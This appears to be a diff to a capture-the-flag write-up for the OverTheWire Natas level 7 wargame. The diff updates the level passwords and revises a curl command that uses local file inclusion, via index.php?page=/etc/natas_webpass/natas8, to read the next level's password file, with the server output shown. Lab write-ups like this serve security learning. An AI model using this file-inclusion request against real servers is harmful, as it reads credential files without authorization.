@@ -1,7 +1,7 @@
-### natas7 pswd: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+### natas7 pswd: B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
 
 ```bash
-curl -v -s -c cookie.txt -X POST http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org
+curl -v -s -c cookie.txt -X POST http://natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0@natas7.natas.labs.overthewire.org
 
 # * Host natas7.natas.labs.overthewire.org:80 was resolved.
 # * IPv6: (none)
@@ -25,15 +25,6 @@ curl -v -s -c cookie.txt -X POST http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@
 # < Content-Type: text/html; charset=UTF-8
 # < 
 # <html>
-# <head>
-# <!-- This stuff in the header has nothing to do with the level -->
-# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
-# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
-# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
-# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
-# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
-# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
-# <script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
 # <body>
 # <h1>natas7</h1>
 # <div id="content">
@@ -51,10 +42,10 @@ curl -v -s -c cookie.txt -X POST http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@
 
 ```
 
-let's try it, instead of `page=home` checking `page=/etc/natas_webpass/natas8`
+let's try it, instead of `index.php?page=home` checking `index.php?page=/etc/natas_webpass/natas8`
 
 ```bash
-curl -v -s -c cookie.txt -X POST http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org
+curl -v -s -c cookie.txt -X POST http://natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0@natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 
 # * Host natas7.natas.labs.overthewire.org:80 was resolved.
 # * IPv6: (none)
@@ -86,7 +77,7 @@ curl -v -s -c cookie.txt -X POST http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@
 # <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
 # <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
 # <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
-# <script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
+# <script>var wechallinfo = { "level": "natas7", "pass": "B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0" };</script></head>
 # <body>
 # <h1>natas7</h1>
 # <div id="content">
@@ -95,7 +86,7 @@ curl -v -s -c cookie.txt -X POST http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@
 # <a href="index.php?page=about">About</a>
 # <br>
 # <br>
-  xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
 # 
 # <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
 # </div>
